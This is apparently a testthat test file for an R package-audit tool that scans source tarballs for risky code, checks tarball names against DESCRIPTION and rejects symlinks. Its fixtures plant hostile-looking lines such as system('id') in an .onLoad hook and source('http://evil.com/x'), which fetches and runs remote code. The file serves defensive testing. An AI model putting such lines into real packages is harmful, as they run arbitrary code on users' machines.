# Build a minimal .tar.gz source package containing one R file. The tarball is
# named <pkg_name>_<version>.tar.gz so it follows the R source-package naming
# convention. Returns the tarball path; the caller unlink()s it.
make_test_tarball <- function(r_content, pkg_name = "testpkg", version = "0.1.0") {
  base_dir <- tempfile()
  pkg_dir  <- file.path(base_dir, pkg_name)
  dir.create(file.path(pkg_dir, "R"), recursive = TRUE, showWarnings = FALSE)
  writeLines(c(paste("Package:", pkg_name), paste("Version:", version)),
             file.path(pkg_dir, "DESCRIPTION"))
  writeLines(r_content, file.path(pkg_dir, "R", "zzz.R"))

  out_dir <- tempfile("tb")
  dir.create(out_dir)
  tarball <- file.path(out_dir, sprintf("%s_%s.tar.gz", pkg_name, version))
  old_wd  <- setwd(base_dir)
  on.exit(setwd(old_wd), add = TRUE)
  utils::tar(tarball, files = pkg_name, compression = "gzip", tar = "internal")
  unlink(base_dir, recursive = TRUE)
  tarball
}

# error paths ------------------------------------------------------------------
test_that("audit_tarball() stops if the path does not exist", {
  expect_error(audit_tarball("/no/such/file.tar.gz"), "file.exists")
})

test_that("audit_tarball() stops when no directory matches the package name", {
  # Tarball named foo_0.1.0.tar.gz but containing a directory named 'bar'.
  base_dir <- tempfile()
  dir.create(file.path(base_dir, "bar", "R"), recursive = TRUE)
  writeLines(c("Package: bar", "Version: 0.1.0"),
             file.path(base_dir, "bar", "DESCRIPTION"))
  writeLines("system('id')", file.path(base_dir, "bar", "R", "zzz.R"))

  out_dir <- tempfile("tb"); dir.create(out_dir)
  tarball <- file.path(out_dir, "foo_0.1.0.tar.gz")
  old_wd  <- setwd(base_dir)
  utils::tar(tarball, files = "bar", compression = "gzip", tar = "internal")
  setwd(old_wd)
  on.exit(unlink(c(base_dir, out_dir), recursive = TRUE), add = TRUE)

  expect_error(audit_tarball(tarball), "No directory named 'foo'")
})

test_that(".reject_extracted_symlinks() refuses a directory containing a symlink", {
  skip_on_os("windows")
  d <- tempfile(); dir.create(d)
  on.exit(unlink(d, recursive = TRUE), add = TRUE)
  writeLines("x", file.path(d, "real.txt"))
  file.symlink(file.path(d, "real.txt"), file.path(d, "link.txt"))

  expect_error(.reject_extracted_symlinks(d), "symlink")
})

test_that(".reject_extracted_symlinks() accepts a symlink-free directory", {
  d <- tempfile(); dir.create(file.path(d, "sub"), recursive = TRUE)
  on.exit(unlink(d, recursive = TRUE), add = TRUE)
  writeLines("x", file.path(d, "sub", "a.txt"))

  expect_true(.reject_extracted_symlinks(d))
})

test_that("audit_tarball() refuses an archive with more than one top-level directory", {
  # foo_0.1.0.tar.gz containing both foo/ and an unrelated bar/: validate_tar()
  # fails closed before extraction rather than picking one directory.
  base_dir <- tempfile()
  dir.create(file.path(base_dir, "foo", "R"), recursive = TRUE)
  dir.create(file.path(base_dir, "bar"), recursive = TRUE)
  writeLines(c("Package: foo", "Version: 0.1.0"),
             file.path(base_dir, "foo", "DESCRIPTION"))
  writeLines("system('id')", file.path(base_dir, "foo", "R", "zzz.R"))
  writeLines("source('http://evil.com/x')", file.path(base_dir, "bar", "sneaky.R"))

  out_dir <- tempfile("tb"); dir.create(out_dir)
  tarball <- file.path(out_dir, "foo_0.1.0.tar.gz")
  old_wd  <- setwd(base_dir)
  utils::tar(tarball, files = c("foo", "bar"), compression = "gzip", tar = "internal")
  setwd(old_wd)
  on.exit(unlink(c(base_dir, out_dir), recursive = TRUE), add = TRUE)

  err <- tryCatch(audit_tarball(tarball), error = function(e) e)
  expect_s3_class(err, "pkgaudit_invalid_tarball")
  expect_match(conditionMessage(err), "top-level directories")
})

test_that("audit_tarball() rejects unsupported compression up front", {
  f <- tempfile(fileext = ".tar.xz")
  writeLines("not really xz", f)   # never read; extension is rejected first
  on.exit(unlink(f), add = TRUE)
  expect_error(audit_tarball(f), "unsupported archive")
})

# happy path -------------------------------------------------------------------
test_that("audit_tarball() returns the four-frame result and relative paths", {
  tb <- make_test_tarball(".onLoad <- function(libname, pkgname) system('id')")
  on.exit(unlink(tb), add = TRUE)

  res <- audit_tarball(tb)
  expect_s3_class(res, "pkgaudit")
  expect_named(res, c("file_contexts", "code_contexts", "patterns", "errors",
                      "metadata"))

  expect_true("onload_code" %in% res$code_contexts$rule)
  sys <- res$patterns[res$patterns$rule == "system_pattern", ]
  expect_equal(nrow(sys), 1L)
  expect_equal(sys$code_context, "onload_code")

  # Paths are relative to the package root, not the extraction temp dir.
  expect_true(all(startsWith(res$patterns$file_context, "R/")))
  expect_false(any(startsWith(res$patterns$file_context, tempdir())))
})

test_that("audit_tarball() handles a package name containing a dot", {
  tb <- make_test_tarball("system('id')", pkg_name = "my.pkg", version = "1.2.3")
  on.exit(unlink(tb), add = TRUE)
  res <- audit_tarball(tb)
  expect_true("system_pattern" %in% res$patterns$rule)
})

test_that("audit_tarball() returns no patterns for a clean package", {
  tb <- make_test_tarball("my_fn <- function(x) x + 1")
  on.exit(unlink(tb), add = TRUE)

  res <- audit_tarball(tb)
  expect_equal(nrow(res$patterns), 0L)
  expect_equal(nrow(res$errors), 0L)
})

# provenance -------------------------------------------------------------------
test_that("audit_tarball() warns when the filename name disagrees with DESCRIPTION", {
  # Tarball named foo_1.0.tar.gz (extracts to foo/) but DESCRIPTION says realname.
  base <- tempfile()
  dir.create(file.path(base, "foo", "R"), recursive = TRUE)
  writeLines(c("Package: realname", "Version: 1.0"),
             file.path(base, "foo", "DESCRIPTION"))
  writeLines("invisible(NULL)", file.path(base, "foo", "R", "zzz.R"))
  out <- tempfile("tb"); dir.create(out)
  tb  <- file.path(out, "foo_1.0.tar.gz")
  owd <- setwd(base)
  utils::tar(tb, files = "foo", compression = "gzip", tar = "internal")
  setwd(owd)
  on.exit(unlink(c(base, out), recursive = TRUE), add = TRUE)

  expect_warning(res <- audit_tarball(tb), "package name 'foo' vs DESCRIPTION Package 'realname'")
  expect_equal(res$metadata$pkg_name, "realname")  # DESCRIPTION still wins
})

test_that("audit_tarball() warns when the filename version disagrees with DESCRIPTION", {
  # Tarball named foo_1.0.tar.gz but DESCRIPTION Version is 9.9.
  base <- tempfile()
  dir.create(file.path(base, "foo", "R"), recursive = TRUE)
  writeLines(c("Package: foo", "Version: 9.9"),
             file.path(base, "foo", "DESCRIPTION"))
  writeLines("invisible(NULL)", file.path(base, "foo", "R", "zzz.R"))
  out <- tempfile("tb"); dir.create(out)
  tb  <- file.path(out, "foo_1.0.tar.gz")
  owd <- setwd(base)
  utils::tar(tb, files = "foo", compression = "gzip", tar = "internal")
  setwd(owd)
  on.exit(unlink(c(base, out), recursive = TRUE), add = TRUE)

  expect_warning(res <- audit_tarball(tb), "version '1.0' vs DESCRIPTION Version '9.9'")
  expect_equal(res$metadata$pkg_version, "9.9")  # DESCRIPTION still wins
})

test_that("audit_tarball() mismatch is a classed condition carrying structured fields", {
  base <- tempfile()
  dir.create(file.path(base, "foo", "R"), recursive = TRUE)
  writeLines(c("Package: realname", "Version: 9.9"),
             file.path(base, "foo", "DESCRIPTION"))
  writeLines("invisible(NULL)", file.path(base, "foo", "R", "zzz.R"))
  out <- tempfile("tb"); dir.create(out)
  tb  <- file.path(out, "foo_1.0.tar.gz")
  owd <- setwd(base)
  utils::tar(tb, files = "foo", compression = "gzip", tar = "internal")
  setwd(owd)
  on.exit(unlink(c(base, out), recursive = TRUE), add = TRUE)

  cond <- tryCatch(audit_tarball(tb),
                   pkgaudit_provenance_mismatch = function(w) w)
  expect_s3_class(cond, "pkgaudit_provenance_mismatch")
  expect_s3_class(cond, "warning")
  expect_equal(cond$filename_name, "foo")
  expect_equal(cond$filename_version, "1.0")
  expect_equal(cond$desc_name, "realname")
  expect_equal(cond$desc_version, "9.9")
})

test_that("audit_tarball() does not warn when filename and DESCRIPTION agree", {
  tb <- make_test_tarball("invisible(NULL)", pkg_name = "testpkg", version = "0.1.0")
  on.exit(unlink(tb), add = TRUE)
  expect_no_warning(audit_tarball(tb))
})

# internal helpers -------------------------------------------------------------
test_that(".extract_tarball() extracts into temp_dir and returns the kept dir", {
  tb <- make_test_tarball("invisible(NULL)", pkg_name = "testpkg")
  td <- tempfile("ex"); dir.create(td)
  on.exit(unlink(c(tb, td), recursive = TRUE), add = TRUE)

  dir <- .extract_tarball(tb, td)
  expect_true(dir.exists(dir))                       # kept on success
  expect_true(startsWith(dir, td))                   # created under temp_dir
  expect_true(dir.exists(file.path(dir, "testpkg"))) # package directory present
})

test_that(".extract_tarball() cleans up its temp dir when extraction fails", {
  td <- tempfile("ex"); dir.create(td)
  bogus <- file.path(td, "bogus.tar")
  writeLines("not a tar", bogus)
  on.exit(unlink(td, recursive = TRUE), add = TRUE)

  expect_error(suppressWarnings(.extract_tarball(bogus, td)))
  # The transient on.exit removed the just-created extraction subdirectory, so
  # a failed extraction leaks no directory under temp_dir.
  expect_equal(length(list.dirs(td, recursive = FALSE)), 0L)
})

test_that(".validate_tarball_extraction() returns pkg_dir and the parsed names", {
  root <- tempfile("root"); dir.create(file.path(root, "foo"), recursive = TRUE)
  on.exit(unlink(root, recursive = TRUE), add = TRUE)

  ex <- .validate_tarball_extraction("path/to/foo_1.0.tar.gz", root)
  expect_equal(ex$pkg_name, "foo")
  expect_equal(ex$tar_name, "foo_1.0")
  expect_equal(ex$pkg_dir, file.path(root, "foo"))
})

test_that(".validate_tarball_extraction() errors when no matching directory exists", {
  root <- tempfile("root"); dir.create(file.path(root, "bar"), recursive = TRUE)
  on.exit(unlink(root, recursive = TRUE), add = TRUE)

  expect_error(
    .validate_tarball_extraction("path/to/foo_1.0.tar.gz", root),
    "No directory named 'foo'"
  )
})

test_that(".validate_tarball_name() is silent when filename and DESCRIPTION agree", {
  expect_no_warning(
    .validate_tarball_name("foo_1.0.tar.gz", "foo_1.0", "foo", "foo", "1.0")
  )
})

test_that(".validate_tarball_name() warns with structured fields on a name mismatch", {
  cond <- tryCatch(
    .validate_tarball_name("foo_1.0.tar.gz", "foo_1.0", "foo", "realname", "1.0"),
    pkgaudit_provenance_mismatch = function(w) w
  )
  expect_s3_class(cond, "pkgaudit_provenance_mismatch")
  expect_s3_class(cond, "warning")
  expect_match(conditionMessage(cond),
               "package name 'foo' vs DESCRIPTION Package 'realname'")
  expect_equal(cond$filename_name, "foo")
  expect_equal(cond$filename_version, "1.0")
  expect_equal(cond$desc_name, "realname")
})

test_that(".validate_tarball_name() warns on a version mismatch", {
  expect_warning(
    .validate_tarball_name("foo_1.0.tar.gz", "foo_1.0", "foo", "foo", "9.9"),
    "version '1.0' vs DESCRIPTION Version '9.9'"
  )
})

test_that(".validate_tarball_name() does not warn when DESCRIPTION fields are NA", {
  expect_no_warning(
    .validate_tarball_name("foo_1.0.tar.gz", "foo_1.0", "foo",
                           NA_character_, NA_character_)
  )
})
